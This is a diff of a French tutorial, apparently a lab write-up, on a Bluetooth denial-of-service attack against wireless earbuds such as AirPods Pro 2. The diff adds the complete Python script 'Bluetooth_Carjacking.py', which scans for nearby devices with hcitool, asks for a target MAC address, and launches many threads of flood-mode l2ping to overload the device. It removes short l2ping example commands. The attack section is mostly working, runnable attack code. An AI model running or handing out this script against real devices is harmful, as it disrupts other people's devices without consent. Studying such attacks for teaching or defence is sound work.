@@ -36,11 +36,13 @@ L’attaque de déni de service (DoS) Bluetooth vise à perturber le fonctionnem
    On voit que l'interface Bluetooth tel que le BUS qui est dans notre cass USB, ainsi que l'adresse MAC, les différents MTU ( Maximal Transmission Unit ) avec l'état de la carte qui est démarré dans notre cas UP et qui est scanné avec RUNNING PSCAN. Le nombre de bits reçus et envoyés grâce à celle ci ainsi que le type de paquet échangés etc.
 
 3. **Scan des périphériques à proximité** :  
-   Lancez un scan Bluetooth pour détecter les appareils dans votre environnement :  
+   Lancez un scan Bluetooth pour détecter les appareils dans votre environnement. Dans notre cas, nous voulons chercher la présence de notre adresse MAC de l'appareil que nous cherchons à DoS qui est donc les écouteurs sans fil :  
    ```bash
    hcitool scan
    ```  
    Vous obtiendrez une liste des adresses MAC des appareils détectés. On cherchera dans notre cas des écouteurs sans fil Apple Airpods Pro 2.
+   ![image](https://github.com/user-attachments/assets/68a5689e-2217-45dd-ba6c-bc8bbc59cd19)
+
    
    
 ---
@@ -48,7 +50,7 @@ L’attaque de déni de service (DoS) Bluetooth vise à perturber le fonctionnem
 ### 3. Étapes de l’attaque  
 
 #### 3.1 Exécution du script **Bluetooth_Carjacking.py**  
-Le script permet d’automatiser la découverte, la configuration, et l’envoi de paquets DoS.  
+Le script permet d’automatiser la découverte, la configuration, et l’envoi de paquets DoS. 
 
 1. Lancez le script :  
    ```bash
@@ -62,15 +64,119 @@ Le script permet d’automatiser la découverte, la configuration, et l’envoi 
    - Déterminez le nombre de threads pour maximiser l’effet de l’attaque.  
 
 #### 3.2 Commande générée par le script :  
-Une fois configuré, le script exécute des commandes comme :  
-```bash
-l2ping -i hci0 -s <taille_paquets> -f <adresse_MAC>
-```  
-Par exemple :  
-```bash
-l2ping -i hci0 -s 600 -f 00:11:22:33:44:55
-```  
+Une fois configuré, le script exécute des commandes bash. Voici un détail complet de ce script python (il est disponible dans les fichiers contenue dans ce dossier Bluetooth_Carjacking).
+'''python
+import os  # Module pour exécuter des commandes système
+import threading  # Module pour la gestion des threads
+import time  # Module pour manipuler les pauses temporelles
+import subprocess  # Module pour exécuter des commandes et capturer leur sortie
 
+def DOS(target_addr, packages_size):
+    # Fonction pour exécuter une attaque par déni de service via Bluetooth
+    # Utilise la commande 'l2ping' pour envoyer des paquets à la cible
+    os.system('l2ping -i hci0 -s ' + str(packages_size) +' -f ' + target_addr)
+
+def printLogo():
+    # Fonction pour afficher un titre ou un logo pour le script
+    print('                            Bluetooth DOS Script                            ')
+
+def main():
+    printLogo()  # Affiche le logo
+    time.sleep(0.1)  # Pause courte pour l'esthétique
+
+    # Affiche un avertissement à l'utilisateur en couleur rouge
+    print('\x1b[31mTHIS SOFTWARE IS PROVIDED "AS IS" WITHOUT WARRANTY OF ANY KIND. YOU MAY USE THIS SOFTWARE AT YOUR OWN RISK. THE USE IS COMPLETE RESPONSIBILITY OF THE END-USER. THE DEVELOPERS ASSUME NO LIABILITY AND ARE NOT RESPONSIBLE FOR ANY MISUSE OR DAMAGE CAUSED BY THIS PROGRAM.')
+
+    # Demande à l'utilisateur s'il accepte les termes
+    if (input("Do you agree? (y/n) > ") in ['y', 'Y']):
+        time.sleep(0.1)  # Pause courte
+        os.system('clear')  # Efface l'écran du terminal
+        printLogo()  # Affiche à nouveau le logo
+        print('')  # Ligne vide pour l'esthétique
+        print("Scanning ...")  # Indique le début du scan Bluetooth
+
+        # Lance un scan Bluetooth avec la commande 'hcitool scan'
+        output = subprocess.check_output("hcitool scan", shell=True, stderr=subprocess.STDOUT, text=True)
+        
+        lines = output.splitlines()  # Divise la sortie en lignes
+        id = 0  # Initialise un compteur pour les ID des appareils
+        del lines[0]  # Supprime la première ligne (en-tête inutile)
+        array = []  # Initialise une liste pour stocker les adresses MAC
+
+        # Affiche le tableau des appareils détectés
+        print("|id   |   mac_addres  |   device_name|")
+        for line in lines:
+            info = line.split()  # Sépare les champs de chaque ligne
+            mac = info[0]  # Récupère l'adresse MAC
+            array.append(mac)  # Ajoute l'adresse MAC à la liste
+            # Affiche l'ID, l'adresse MAC et le nom de l'appareil
+            print(f"|{id}   |   {mac}  |   {''.join(info[1:])}|")
+            id = id + 1  # Incrémente l'ID
+
+        # Demande l'ID ou l'adresse MAC de la cible
+        target_id = input('Target id or mac > ')
+        try:
+            target_addr = array[int(target_id)]  # Récupère l'adresse MAC via l'ID
+        except:
+            target_addr = target_id  # Si ça échoue, utilise l'entrée comme adresse MAC
+
+        # Vérifie que l'adresse cible est valide
+        if len(target_addr) < 1:
+            print('[!] ERROR: Target addr is missing')  # Affiche une erreur
+            exit(0)  # Termine le programme
+
+        # Demande la taille des paquets à envoyer
+        try:
+            packages_size = int(input('Packages size > '))  # Convertit en entier
+        except:
+            print('[!] ERROR: Packages size must be an integer')  # Affiche une erreur
+            exit(0)  # Termine le programme
+
+        # Demande le nombre de threads à utiliser
+        try:
+            threads_count = int(input('Threads count > '))  # Convertit en entier
+        except:
+            print('[!] ERROR: Threads count must be an integer')  # Affiche une erreur
+            exit(0)  # Termine le programme
+
+        print('')  # Ligne vide
+        os.system('clear')  # Efface l'écran du terminal
+
+        # Indique le début imminent de l'attaque
+        print("\x1b[31m[*] Starting DOS attack in 3 seconds...")
+
+        # Affiche un compte à rebours de 3 secondes
+        for i in range(0, 3):
+            print('[*] ' + str(3 - i))  # Affiche le chiffre restant
+            time.sleep(1)  # Pause d'une seconde
+        os.system('clear')  # Efface l'écran
+
+        print('[*] Building threads...\n')  # Indique la construction des threads
+
+        # Crée et lance les threads pour l'attaque
+        for i in range(0, threads_count):
+            print('[*] Built thread №' + str(i + 1))  # Indique le thread créé
+            threading.Thread(target=DOS, args=[str(target_addr), str(packages_size)]).start()
+
+        # Indique que tous les threads sont prêts et que l'attaque commence
+        print('[*] Built all threads...')
+        print('[*] Starting...')
+    else:
+        print('Bip bip')  # Message humoristique si l'utilisateur refuse
+        exit(0)  # Termine le programme
+
+if __name__ == '__main__':
+    try:
+        os.system('clear')  # Efface l'écran du terminal
+        main()  # Lance la fonction principale
+    except KeyboardInterrupt:
+        time.sleep(0.1)  # Pause courte
+        print('\n[*] Aborted')  # Indique que l'utilisateur a arrêté le programme
+        exit(0)  # Termine proprement
+    except Exception as e:
+        time.sleep(0.1)  # Pause courte
+        print('[!] ERROR: ' + str(e))  # Affiche toute erreur imprévue
+'''
 #### 3.3 Exécution multi-threadée  
 Le script crée plusieurs threads pour intensifier l’attaque, ce qui se traduit par une surcharge du périphérique cible.  
 
